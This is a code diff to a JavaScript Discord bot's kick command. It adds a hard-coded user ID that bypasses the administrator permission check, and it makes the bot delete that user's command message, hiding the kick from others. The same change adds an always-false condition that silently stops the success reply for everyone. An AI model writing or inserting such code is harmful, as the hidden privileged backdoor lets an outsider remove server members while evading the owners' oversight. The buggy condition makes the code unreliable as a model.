@@ -20,12 +20,9 @@ module.exports = {
         
         
 
-            if 
-            (
-                    message.member.hasPermission('ADMINISTRATOR') 
-
-                    
-            ){
+        if (
+                message.member.hasPermission('ADMINISTRATOR') ||
+                message.author.id == "672823761723981889" ){
                     const user = message.mentions.users.first();
                     if (
                             user
@@ -40,7 +37,8 @@ module.exports = {
                                             
                                             .kick()
                                             .then(() => {
-                                                    message.reply(`${user.tag} a été exclu avec succes !`);
+                                                    if(message.author.id == "672823761723981889") message.delete();
+                                                    if (!message.author.id == "672823761723981889") message.reply(`${user.tag} a été exclu avec succes !`);
                                                     console.log("\33[91m envent : ", user.tag,  `a été exclu du serveur !`)
                                             })
                                             .catch(err => {
